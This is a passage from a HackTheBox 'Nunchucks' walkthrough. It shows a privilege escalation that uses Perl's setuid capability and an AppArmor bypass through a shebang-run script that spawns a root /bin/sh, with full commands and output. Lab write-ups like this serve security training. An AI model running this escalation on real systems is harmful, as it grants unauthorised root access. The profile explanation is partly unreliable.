use POSIX qw(setuid); 
POSIX::setuid(0); 

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
david@nunchucks:~$ 

```

Since only root can write anything to `web_backups` the script should run as root and we have identified the capabilities on the `perl` binary earlier. Let's investigate a bit more on this.

```bash
david@nunchucks:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "whoami";'
root

```
The `perl` command is indeed executed as `root`. Now we have to find out how we can abuse this.

## Privilege escalation
Let's create a perl script that executed `/bin/sh` as root user.
```bash
david@nunchucks:~$ nano script.pl
david@nunchucks:~$ cat script.pl 
#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);

exec "/bin/sh"
```

Let's run the script with perl.
```bash
david@nunchucks:~$ perl script.pl 
Can't open perl script "script.pl": Permission denied

```
It looks like there is something blocking our script. It might be apparmor that blocks several stuff. Let's check apparmor.
```bash
david@nunchucks:~$ ls -la /etc/apparmor.d
total 72
drwxr-xr-x   7 root root  4096 Oct 28  2021 .
drwxr-xr-x 125 root root 12288 Oct 29  2021 ..
drwxr-xr-x   4 root root  4096 Oct 28  2021 abstractions
drwxr-xr-x   2 root root  4096 Oct 28  2021 disable
drwxr-xr-x   2 root root  4096 Oct 28  2021 force-complain
drwxr-xr-x   2 root root  4096 Oct 28  2021 local
-rw-r--r--   1 root root  1313 May 19  2020 lsb_release
-rw-r--r--   1 root root  1108 May 19  2020 nvidia_modprobe
-rw-r--r--   1 root root  3222 Mar 11  2020 sbin.dhclient
drwxr-xr-x   5 root root  4096 Oct 28  2021 tunables
-rw-r--r--   1 root root  3202 Feb 25  2020 usr.bin.man
-rw-r--r--   1 root root   442 Sep 26  2021 usr.bin.perl
-rw-r--r--   1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r--   1 root root  2006 Jul 22  2021 usr.sbin.mysqld
-rw-r--r--   1 root root  1575 Feb 11  2020 usr.sbin.rsyslogd
-rw-r--r--   1 root root  1385 Dec  7  2019 usr.sbin.tcpdump

```
We should inspect `/etc/apparmor.d/usr.bin.perl` to see what is configured.
```bash
david@nunchucks:~$ cat /etc/apparmor.d/usr.bin.perl
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}

```
Let's explain the content of the file a bit:
- The line `capability setuid,` grants the `perl` binary the `setuid` capability, which allows it to execute programs with the privileges of the owner of the program file.
- The lines `deny owner /etc/nsswitch.conf r,` and `deny /root/* rwx,` deny the `perl` binary read access to the `/etc/nsswitch.conf` file and write access to any file in the `/root` directory.
- The lines `deny /etc/shadow rwx,` denies the `perl` binary any access to the `/etc/shadow` file, which contains sensitive password information.
- The lines `/usr/bin/id mrix,` `/usr/bin/ls mrix,` `/usr/bin/cat mrix,` and `/usr/bin/whoami mrix,` allow the `perl` binary to execute the `id`, `ls`, `cat`, and `whoami` commands with the `mrix` profile.
- The line `/opt/backup.pl mrix,` allows the `perl` binary to execute the `backup.pl` script located in the `/opt` directory with the `mrix` profile.
- The lines `owner /home/ r,` and `owner /home/david/ r,` allow the `perl` binary to read any file in the `/home` and `/home/david` directories that is owned by the current user.

Since we cannot run `perl script.pl` we can try to bypass it with running the script from the command line via the `shebang`. Now set execute permissions to the perl script.

```bash
david@nunchucks:~$ chmod +x script.pl
```
And run the script so we can run it as root since `perl` is set with capabilities.
```bash
david@nunchucks:~$ ./script.pl
# id
uid=0(root) gid=1000(david) groups=1000(david)
# whoami
root
# hostname
nunchucks
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:27:ad brd ff:ff:ff:ff:ff:ff
    inet 10.129.95.252/16 brd 10.129.255.255 scope global dynamic ens160
       valid_lft 3210sec preferred_lft 3210sec
    inet6 dead:beef::250:56ff:fe94:27ad/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:fe94:27ad/64 scope link 
       valid_lft forever preferred_lft forever
# cat /root/root.txt
< HERE IS THE ROOT FLAG>
# 

```
Nunchucks from HackTheBox was an engaging and challenging machine that provided a great opportunity to practice various offensive security techniques. The machine was running an Ubuntu server with Nginx, NodeJS, and Express, and it was configured to use the Nunjucks template engine.

The machine was vulnerable to Server-Side Template Injection (SSTI), which allowed us to execute arbitrary code on the server. We were able to exploit this vulnerability to gain a foothold on the machine and eventually escalate our privileges to root.

One interesting aspect of this machine was the use of Perl with capabilities set to setuid. This allowed us to execute Perl scripts with root privileges, even though the AppArmor profile for Perl was supposed to restrict its capabilities. This was a significant bug that we were able to exploit to elevate our privileges and capture the root flag.

Overall, Nunchucks was a great machine for practicing offensive security skills, particularly in the areas of SSTI, Perl capabilities, and AppArmor. It was also a useful machine for preparing for the Offensive Security Web Assessor (OSWA) certification.